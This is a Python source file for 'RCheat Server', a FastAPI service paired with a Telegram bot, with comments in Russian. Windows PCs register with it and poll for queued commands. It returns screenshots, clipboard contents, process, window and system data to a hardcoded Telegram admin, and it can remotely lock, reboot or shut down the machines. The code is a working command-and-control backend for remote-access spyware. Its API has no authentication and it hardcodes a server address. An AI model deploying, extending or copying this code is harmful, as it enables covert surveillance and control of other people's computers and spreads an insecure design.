import asyncio
import os
import json
import base64
import sqlite3
import time
from datetime import datetime
from fastapi import FastAPI, HTTPException, BackgroundTasks, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import uvicorn
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()

# --- КОНФИГУРАЦИЯ ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 5153650495
SERVER_HOST = "193.233.115.20"
SERVER_PORT = 8080

# --- ИНИЦИАЛИЗАЦИЯ БОТА ---
bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- БАЗА ДАННЫХ ---
DB_PATH = os.path.join(os.path.dirname(__file__), "devices.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            name TEXT,
            last_seen INTEGER,
            user_name TEXT,
            os_info TEXT,
            is_online INTEGER DEFAULT 1,
            last_command TEXT,
            commands_queue TEXT DEFAULT '[]'
        )
    """)
    conn.commit()
    conn.close()

def update_device(device_id: str, name: str, user_name: str = "", os_info: str = ""):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = int(time.time())
    
    cursor.execute("SELECT device_id FROM devices WHERE device_id = ?", (device_id,))
    exists = cursor.fetchone()
    
    if exists:
        cursor.execute("""
            UPDATE devices 
            SET name = ?, last_seen = ?, user_name = ?, os_info = ?, is_online = 1
            WHERE device_id = ?
        """, (name, current_time, user_name, os_info, device_id))
    else:
        cursor.execute("""
            INSERT INTO devices (device_id, name, last_seen, user_name, os_info, is_online)
            VALUES (?, ?, ?, ?, ?, 1)
        """, (device_id, name, current_time, user_name, os_info))
    
    conn.commit()
    conn.close()

def get_device(device_id: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT device_id, name, last_seen, user_name, os_info, is_online, commands_queue FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "device_id": row[0],
            "name": row[1],
            "last_seen": row[2],
            "user_name": row[3],
            "os_info": row[4],
            "is_online": row[5],
            "commands_queue": json.loads(row[6]) if row[6] else []
        }
    return None

def get_all_devices():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT device_id, name, last_seen, user_name, is_online FROM devices ORDER BY last_seen DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows

def delete_device(device_id: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    conn.commit()
    conn.close()

def add_command_to_queue(device_id: str, command: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT commands_queue FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    
    if row:
        queue = json.loads(row[0]) if row[0] else []
        queue.append({"command": command, "timestamp": int(time.time()), "status": "pending"})
        cursor.execute("UPDATE devices SET commands_queue = ? WHERE device_id = ?", (json.dumps(queue), device_id))
    
    conn.commit()
    conn.close()

def get_next_command(device_id: str) -> Optional[str]:
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT commands_queue FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    
    if row:
        queue = json.loads(row[0]) if row[0] else []
        # Ищем первую pending команду
        for i, item in enumerate(queue):
            if item.get("status") == "pending":
                command = item["command"]
                queue[i]["status"] = "sent"
                cursor.execute("UPDATE devices SET commands_queue = ? WHERE device_id = ?", (json.dumps(queue), device_id))
                conn.commit()
                conn.close()
                return command
    
    conn.close()
    return None

def mark_command_done(device_id: str, command: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT commands_queue FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    
    if row:
        queue = json.loads(row[0]) if row[0] else []
        for item in queue:
            if item["command"] == command and item["status"] == "sent":
                item["status"] = "done"
                break
        cursor.execute("UPDATE devices SET commands_queue = ? WHERE device_id = ?", (json.dumps(queue), device_id))
    
    conn.commit()
    conn.close()

# --- PYDANTIC МОДЕЛИ ---
class RegisterData(BaseModel):
    device_id: str
    name: str
    user_name: str
    os_info: str

class PingData(BaseModel):
    device_id: str
    name: str

class CommandResult(BaseModel):
    device_id: str
    command: str
    result: str
    result_type: str = "text"

# --- FASTAPI ---
app = FastAPI(title="RCheat Server", version="1.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- API ---

@app.post("/api/register")
async def register_device(data: RegisterData):
    """Регистрация нового устройства"""
    update_device(
        device_id=data.device_id,
        name=data.name,
        user_name=data.user_name,
        os_info=data.os_info
    )
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🆕 **Новое устройство зарегистрировано!**\n"
             f"💻 Имя: `{data.name}`\n"
             f"👤 Пользователь: `{data.user_name}`\n"
             f"🆔 ID: `{data.device_id}`",
        parse_mode="Markdown",
        reply_markup=get_device_menu(data.device_id)
    )
    
    return {"status": "ok", "message": "Device registered"}

@app.post("/api/ping")
async def ping_device(data: PingData):
    """Обновление статуса устройства и получение команд"""
    update_device(device_id=data.device_id, name=data.name)
    
    command = get_next_command(data.device_id)
    if command:
        return {"status": "ok", "command": command}
    
    return {"status": "ok", "command": None}

@app.post("/api/command_result")
async def command_result(data: CommandResult):
    """Прием результата выполнения команды"""
    mark_command_done(data.device_id, data.command)
    
    device = get_device(data.device_id)
    device_name = device["name"] if device else "ПК"
    
    if data.result_type == "screenshot":
        try:
            image_bytes = base64.b64decode(data.result)
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
                caption=f"📸 Скриншот с ПК: *{device_name}*",
                parse_mode="Markdown",
                reply_markup=get_device_menu(data.device_id)
            )
        except Exception as e:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"❌ Ошибка: {str(e)}",
                parse_mode="Markdown"
            )
    elif data.result_type == "error":
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=f"❌ Ошибка на *{device_name}*:\n`{data.result}`",
            parse_mode="Markdown",
            reply_markup=get_device_menu(data.device_id)
        )
    else:
        if len(data.result) > 4000:
            for i in range(0, len(data.result), 4000):
                chunk = data.result[i:i+4000]
                await bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"📋 Результат с *{device_name}*:\n{chunk}",
                    parse_mode="Markdown",
                    reply_markup=get_device_menu(data.device_id) if i == 0 else None
                )
        else:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"📋 Результат с *{device_name}*:\n{data.result}",
                parse_mode="Markdown",
                reply_markup=get_device_menu(data.device_id)
            )
    
    return {"status": "ok"}

@app.get("/api/devices")
async def get_devices():
    """Получить список всех устройств"""
    devices = get_all_devices()
    result = []
    current_time = int(time.time())
    
    for dev_id, name, last_seen, user_name, is_online in devices:
        result.append({
            "device_id": dev_id,
            "name": name,
            "user_name": user_name,
            "last_seen": last_seen,
            "is_online": current_time - last_seen < 180
        })
    
    return {"devices": result}

@app.get("/api/device/{device_id}")
async def get_device_info(device_id: str):
    """Получить информацию об устройстве"""
    device = get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return device

@app.get("/api/health")
async def health_check():
    return {"status": "ok", "time": time.time()}

# --- БОТ ИНТЕРФЕЙС ---

def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список устройств", callback_data="back_to_list")],
        [InlineKeyboardButton(text="📊 Статистика системы", callback_data="global_stats")],
        [InlineKeyboardButton(text="🗑 Очистить оффлайн", callback_data="clean_offline")]
    ])

def get_device_menu(device_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="🔍 Дополнительно", callback_data=f"cat_extra_{device_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
    ])

def get_monitoring_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_screen_{device_id}")],
        [InlineKeyboardButton(text="📋 Процессы", callback_data=f"cmd_tasklist_{device_id}")],
        [InlineKeyboardButton(text="📱 Открытые окна", callback_data=f"cmd_apps_{device_id}")],
        [InlineKeyboardButton(text="🪟 Активное окно", callback_data=f"cmd_activewin_{device_id}")],
        [InlineKeyboardButton(text="📋 Буфер обмена", callback_data=f"cmd_clipboard_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_system_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔒 Блок экрана", callback_data=f"cmd_lock_{device_id}")],
        [InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_sleep_{device_id}")],
        [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_reboot_{device_id}")],
        [InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_shutdown_{device_id}")],
        [InlineKeyboardButton(text="🔊 Звук макс.", callback_data=f"cmd_volmax_{device_id}")],
        [InlineKeyboardButton(text="🔇 Отключить звук", callback_data=f"cmd_mute_{device_id}")],
        [InlineKeyboardButton(text="🔊 Включить звук", callback_data=f"cmd_unmute_{device_id}")],
        [InlineKeyboardButton(text="💡 Яркость 50%", callback_data=f"cmd_brightness50_{device_id}")],
        [InlineKeyboardButton(text="💡 Яркость 100%", callback_data=f"cmd_brightness100_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_web_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 YouTube", callback_data=f"cmd_yt_{device_id}")],
        [InlineKeyboardButton(text="🔍 Google", callback_data=f"cmd_google_{device_id}")],
        [InlineKeyboardButton(text="🗺 Карты", callback_data=f"cmd_maps_{device_id}")],
        [InlineKeyboardButton(text="💬 Сообщение", callback_data=f"cmd_msg_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_util_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_calc_{device_id}")],
        [InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_notepad_{device_id}")],
        [InlineKeyboardButton(text="🎨 Paint", callback_data=f"cmd_paint_{device_id}")],
        [InlineKeyboardButton(text="⏳ Скринывер", callback_data=f"cmd_scr_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_extra_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💻 Системная инфо", callback_data=f"cmd_sysinfo_{device_id}")],
        [InlineKeyboardButton(text="🌐 Сетевая инфо", callback_data=f"cmd_netinfo_{device_id}")],
        [InlineKeyboardButton(text="🔋 Батарея", callback_data=f"cmd_battery_{device_id}")],
        [InlineKeyboardButton(text="🔄 Точка восстановления", callback_data=f"cmd_restore_{device_id}")],
        [InlineKeyboardButton(text="🔓 Разблокировать приложения", callback_data=f"cmd_unblock_{device_id}")],
        [InlineKeyboardButton(text="🗑 Удалить устройство", callback_data=f"delete_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

# --- БОТ ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer(
        "🤖 **RCheat Server v2.0**\n\n"
        "Управление Windows устройствами через HTTP API\n"
        f"🌐 Сервер: http://{SERVER_HOST}:{SERVER_PORT}\n"
        f"📊 Устройств в БД: {len(get_all_devices())}",
        parse_mode="Markdown",
        reply_markup=get_main_menu()
    )

@dp.callback_query(F.data == "go_to_main_start")
async def go_to_main_start(callback: types.CallbackQuery):
    text = "🤖 **Главное меню**"
    markup = get_main_menu()
    
    try:
        if callback.message.photo or callback.message.document:
            await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
        else:
            await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
    except Exception as e:
        # Игнорируем ошибку "message is not modified"
        pass

@dp.callback_query(F.data == "back_to_list")
async def show_devices_callback(callback: types.CallbackQuery):
    devices = get_all_devices()
    if not devices:
        await callback.message.edit_text("❌ Список устройств пуст.", reply_markup=get_main_menu())
        return
    
    keyboard = []
    current_time = int(time.time())
    
    for dev_id, name, last_seen, user_name, is_online in devices:
        status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
        keyboard.append([InlineKeyboardButton(text=f"{status_emoji} {name} ({user_name})", callback_data=f"manage_{dev_id}")])
    
    keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="go_to_main_start")])
    
    await callback.message.edit_text(
        "🎛 **Список устройств:**",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@dp.callback_query(F.data == "global_stats")
async def global_stats(callback: types.CallbackQuery):
    devices = get_all_devices()
    total = len(devices)
    online = 0
    current_time = int(time.time())
    
    for dev_id, name, last_seen, user_name, is_online in devices:
        if current_time - last_seen < 180:
            online += 1
    
    text = f"📊 **Глобальная статистика:**\n"
    text += f"• Всего устройств: {total}\n"
    text += f"• Онлайн: {online}\n"
    text += f"• Оффлайн: {total - online}\n"
    text += f"• Активность: {int(online/total*100) if total > 0 else 0}%\n"
    text += f"🌐 Сервер: http://{SERVER_HOST}:{SERVER_PORT}"
    
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=get_main_menu())

@dp.callback_query(F.data == "clean_offline")
async def clean_offline(callback: types.CallbackQuery):
    devices = get_all_devices()
    current_time = int(time.time())
    deleted = 0
    
    for dev_id, name, last_seen, user_name, is_online in devices:
        if current_time - last_seen >= 180:
            delete_device(dev_id)
            deleted += 1
    
    await callback.answer(f"🗑 Удалено {deleted} оффлайн устройств")
    
    devices = get_all_devices()
    if not devices:
        await callback.message.edit_text("✅ Все оффлайн устройства удалены.", reply_markup=get_main_menu())
        return
    
    keyboard = []
    for dev_id, name, last_seen, user_name, is_online in devices:
        status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
        keyboard.append([InlineKeyboardButton(text=f"{status_emoji} {name}", callback_data=f"manage_{dev_id}")])
    
    await callback.message.edit_text(
        "🎛 **Обновленный список устройств:**",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device = get_device(device_id)
    if not device:
        await callback.answer("❌ Устройство удалено или не найдено.")
        return
    
    current_time = int(time.time())
    status_str = "🟢 Онлайн" if current_time - device["last_seen"] < 180 else "🔴 Оффлайн"
    
    text = f"💻 Управление ПК: *{device['name']}*\n"
    text += f"👤 Пользователь: `{device['user_name']}`\n"
    text += f"Статус: {status_str}\n"
    text += f"🆔 ID: `{device_id}`"
    
    markup = get_device_menu(device_id)
    
    try:
        if callback.message.photo or callback.message.document:
            await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
        else:
            await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
    except Exception as e:
        pass

@dp.callback_query(F.data.startswith("delete_"))
async def delete_device_callback(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device = get_device(device_id)
    if device:
        delete_device(device_id)
        await callback.answer(f"✅ Устройство {device['name']} удалено")
    else:
        await callback.answer("❌ Устройство не найдено")
    
    await show_devices_callback(callback)

@dp.callback_query(F.data.startswith("cat_"))
async def handle_categories(callback: types.CallbackQuery):
    data = callback.data.split("_")
    cat, dev_id = data[1], data[2]
    
    text = ""
    markup = None
    
    if cat == "mon":
        text = "📊 **Мониторинг**"
        markup = get_monitoring_menu(dev_id)
    elif cat == "sys":
        text = "⚙️ **Системные действия**"
        markup = get_system_menu(dev_id)
    elif cat == "web":
        text = "🌐 **Ресурсы**"
        markup = get_web_menu(dev_id)
    elif cat == "util":
        text = "🛠 **Утилиты**"
        markup = get_util_menu(dev_id)
    elif cat == "extra":
        text = "🔍 **Дополнительные функции**"
        markup = get_extra_menu(dev_id)
    else:
        return

    try:
        if callback.message.photo or callback.message.document:
            await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
        else:
            await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
    except Exception as e:
        pass

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    if len(parts) < 3:
        await callback.answer("❌ Ошибка в команде")
        return
    
    cmd_type = parts[1]
    device_id = parts[2]
    
    if cmd_type == "brightness50":
        full_cmd = "brightness:50"
    elif cmd_type == "brightness100":
        full_cmd = "brightness:100"
    elif cmd_type == "mute":
        full_cmd = "mute"
    elif cmd_type == "unmute":
        full_cmd = "unmute"
    elif cmd_type == "apps":
        full_cmd = "apps"
    elif cmd_type == "activewin":
        full_cmd = "activewin"
    elif cmd_type == "clipboard":
        full_cmd = "clipboard"
    elif cmd_type == "sysinfo":
        full_cmd = "sysinfo"
    elif cmd_type == "netinfo":
        full_cmd = "netinfo"
    elif cmd_type == "battery":
        full_cmd = "battery"
    elif cmd_type == "restore":
        full_cmd = "restore"
    elif cmd_type == "unblock":
        full_cmd = "unblock"
    else:
        full_cmd = cmd_type
    
    add_command_to_queue(device_id, full_cmd)
    
    device = get_device(device_id)
    await callback.answer(f"🚀 Команда отправлена устройству {device['name'] if device else ''}!")

# --- ЗАПУСК ---

async def main():
    init_db()
    print(f"[СЕРВЕР] База данных инициализирована")
    print(f"[СЕРВЕР] Бот запущен, ID админа: {ADMIN_ID}")
    print(f"[СЕРВЕР] HTTP сервер: http://{SERVER_HOST}:{SERVER_PORT}")
    
    bot_task = asyncio.create_task(dp.start_polling(bot))
    
    config = uvicorn.Config(app, host="0.0.0.0", port=SERVER_PORT, log_level="info")
    server = uvicorn.Server(config)
    
    try:
        await server.serve()
    finally:
        bot_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
